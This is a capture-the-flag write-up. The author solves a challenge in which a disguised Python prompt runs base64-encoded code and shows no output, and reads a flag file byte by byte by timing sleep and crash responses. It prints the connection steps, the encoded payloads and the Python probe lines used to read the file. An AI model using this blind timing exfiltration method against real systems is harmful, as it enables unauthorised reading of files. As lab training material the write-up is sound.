## snakebtte

This challange was worth 100 points, but IMHO harder than others as it required some coding - it was also partly broken; the intended solution didn't work. My guess is that python should've returned output here.

nmap 10.10.0.229 -- port 9999/TCP is open

```
$ telnet 10.10.0.229 9999
Trying 10.10.0.229...
Connected to 10.10.0.229.
Escape character is '^]'.
Python 133.7.0 (default, Jul 15 2042, 10:44:58)
[GCC 168.1.1 20180531] on linix
Type "help", "copyright", "credits" or "license" for more information. Long live the Waterlord!
>>> dummy
RG8gbm90IHR5cGUgdW5lbmNyeXB0ZWQhIFRoZSBkaXJ0LXBlb3BsZSBtaWdodCBiZSBsaXN0ZW5pbmcK
>>> 
```

This looked very familiar - it's a modified python prompt.
The text is base64 and decodes to: "Do not type unencrypted! The dirt-people might be listening"
So my guess was python code can be send base64-encoded. e.g.:

import os => aW1wb3J0IHRpbWUK

If you send invalid python code, the shell will disconnect.
However, commands issued do not return any output, except another command prompt ">>>".

First thing was to find out the pyton version and verify python is actually running our commands:
```
import sys
import time
sys.version[0]=='3' and time.sleep(5)

# translates to:
aW1wb3J0IHN5cwo=
aW1wb3J0IHRpbWUK
c3lzLnZlcnNpb25bMF09PSczJyBhbmQgdGltZS5zbGVlcCg1KQo=
```

The shell indeed paused for 5 seconds, so it's python3.

I guessed the path of the FLAG.TXT correctly - trying to open a nonexistent file will cause the shell to terminate.

To verify this, I checked the start of the file - we already know that flags are in the form DORF18{...}.
0 is the position in the file we're trying to brute-force, D and O are the characters to test for.
This verified that FLAG.TXT is the correct file as it sleeps for 10 seconds:

```
import os
import time
f = open('FLAG.TXT', 'r')
data = f.read()
(data)[0]=='D' and time.sleep(5)
(data)[1]=='O' and time.sleep(5)
```

It was impossible to do data exfiltration through os.system(), as the system could not reach the outside.
Thus a time-based method can be used (base64-encode each line individually and send it to the server):

```
import os
import time
f = open('FLAG.TXT', 'r')
data = f.read()
(data)[$1]=='$2' and crash
time.sleep(2)
dummy
exit==
```

Our goal is to compare each byte of FLAG.TXT to a charset and measure how long the query took.
The "dummy" line makes the program return the text from the beginning and is used to verify that there was no disconnect or other problem. "crash" is used to make the code exit faster if there's a match.

In order to account for 1337-speak and _ as space and to speed up the exfiltration of the flag, the following was used:
_ A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 3 4 5 7 a b c d e f g h i j k l m n o p q r s t u v w x y z . - 2 6 8 9 { }

I wrapped this up in some very ugly bash code + netcat and measured the time for each run and exfiltrating the flag very slowly.
The server only allows one connection at a time, so running multiple instances of the code couldn't work. Only afterwards I noticed I could've used divide-and-conquer (pasting a lot more lines at once) to speed this up reasonably and should've done the used the crash-condition the other way around.
However, I managed to get the Flag about 10 minutes before the CTF was shut down. :)

### FLAG
DORF18{Y0U_S33m_T0_Kn0W_BASE64}

